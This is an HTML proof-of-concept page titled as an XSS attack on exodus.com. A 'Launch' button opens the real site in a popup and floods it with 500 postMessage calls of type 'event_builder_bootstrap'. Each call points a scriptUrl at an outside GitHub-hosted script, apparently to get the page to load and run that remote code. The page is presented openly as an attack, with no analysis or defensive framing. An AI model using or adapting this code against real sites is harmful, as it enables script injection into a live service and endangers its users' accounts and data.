<!DOCTYPE html>
<html>
<head>
  <title>Exodus XSS Flood PoC</title>
</head>
<body>
  <h1>🚨 Click the button to launch the attack</h1>
  <button id="launch">🚀 Launch</button>

  <script>
    document.getElementById("launch").onclick = function () {
      const exodusWindow = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");

      if (!exodusWindow) {
        alert("❌ Popup blocked! Please allow popups and try again.");
        return;
      }

      const TOTAL_REQUESTS = 500;
      const INTERVAL_MS = 120;

      setTimeout(() => {
        let count = 0;
        const interval = setInterval(() => {
          if (count >= TOTAL_REQUESTS) {
            clearInterval(interval);
            console.log("✅ Finished sending 500 requests.");
            return;
          }

          try {
            exodusWindow.postMessage({
              type: "event_builder_bootstrap",
              scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js"
            }, "https://www.exodus.com");

            count++;
            console.log(`🔁 Sent ${count} / ${TOTAL_REQUESTS}`);
          } catch (e) {
            console.error("❌ Failed to send message:", e);
          }

        }, INTERVAL_MS);
      }, 3000);
    };
  </script>
</body>
</html>
